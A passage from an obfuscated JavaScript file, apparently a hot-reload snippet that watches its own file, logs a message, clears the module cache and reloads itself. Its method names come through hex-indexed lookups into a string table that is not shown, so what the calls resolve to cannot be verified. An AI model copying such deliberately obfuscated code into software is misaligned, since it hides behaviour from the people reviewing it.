        _0x13ebe7 = _0x13ebe7 - 0x10b;
        let _0x4d2978 = _0x14aaa5[_0x13ebe7];
        return _0x4d2978;
    }, _0x13eb(_0x429c0a, _0x4bda13);
}
let file = require[_0x571414(0x213)](__filename);
require('fs')[_0x571414(0x1be)](file, () => {
    const _0x4b5e28 = _0x571414;
    require('fs')[_0x4b5e28(0x1b3)](file), console[_0x4b5e28(0x1e1)](_0x4b5e28(0x185) + __filename + _0x4b5e28(0x19c)), delete require[_0x4b5e28(0x20d)][file], require(file);
});